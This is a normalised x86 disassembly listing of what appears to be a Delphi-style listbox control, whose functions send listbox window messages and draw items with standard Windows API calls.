mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4350e8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f558
mov eax [ esi + 0x228 ]
call sub_403258
mov eax [ esi + 0x218 ]
call sub_403258
mov eax [ esi + 0x240 ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4351b4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4351d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_435210
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_435230
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_443708
push eax
call SendMessageA
sub_435264
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_4356b8
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4352ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4353c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4353ca
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fcc
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404468
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041a0
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404468
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4041a0
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_435668
test al al
je r-xdata
jmp r-xdata
sub_4353d4
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_435668
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_435440
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_43c924
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a68
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_443708
push eax
call SendMessageA
mov esi 0x1
sub_435494
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_440ca8
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax ebx
call sub_435440
sub_4354d8
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_435554
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_443708
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_443708
push eax
call SendMessageA
jmp r-xdata
sub_4355b4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_440ca8
mov eax ebx
mov si 0xffd0
call sub_403454
sub_4355dc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_43e0d4
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_435668
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_443708
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
sub_4356b8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_443708
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_443708
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_443708
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
jmp r-xdata
sub_43578c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_440ca8
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_435768
sub_4357e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43588c
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435893
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404468
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408718
mov eax [ ebp - 0x4 ]
call sub_404268
mov [ esi + 0xc ] eax
jmp r-xdata
sub_435898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43592e
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435935
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404268
mov [ esi + 0xc ] eax
jmp r-xdata
sub_435950
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4357c8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_443708
push eax
call SendMessageA
sub_43597c
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_43578c
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43578c
jmp r-xdata
sub_4359c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_4357c8
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_43e0d4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_435a4c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_440594
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4404c0
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403454
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_435b64
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_4406c0
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_443708
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_435440
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_443708
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_43652c
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_435950
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d250
sub_435c34
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_440aa4
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_4357c8
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_435cb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_44111c
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_43d690
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_441088
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_435d16
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_453d60
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_43e5a4
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43d5c8
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069fc
mov edx esp
mov cl 0x1
mov eax esi
call sub_4359c0
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_435668
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43d5c8
jmp r-xdata
sub_435db4
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43cb2c
mov eax esi
mov si 0xffeb
call sub_403454
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403454
jmp r-xdata
pop esi
retn
sub_435de8
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_443708
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_443708
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_443708
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_443708
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_443708
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_4357c8
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_412b10
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_435f48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441898
push ebp
call sub_435de8
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_435f8c
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_43ca64
lea eax [ esp + 0x18 ]
call sub_406a10
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_435fec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4360f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_41d988
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4360ff
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edx 0x824
mov eax ebx
call sub_43f200
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_436610
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403fa8
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404268
push eax
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
mov eax [ ebx + 0x228 ]
call sub_41dd2c
push eax
call DrawTextA
sub_436128
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_41ddac
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_41dc4c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_41dc68
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_41d988
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d5e4
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce18
xor edx edx
mov eax [ esi + 0x228 ]
call sub_41ddac
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_4361e4
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_436214
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442d20
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_440ca8
sub_436240
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_4356b8
inc edi
dec ebx
jne r-xdata
sub_436278
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_404468
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443708
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_436658
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403454
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406a30
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443708
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_43635c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_43651c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4426ec
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436523
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403fcc
retn
call GetTickCount
mov edx [ ebx ]
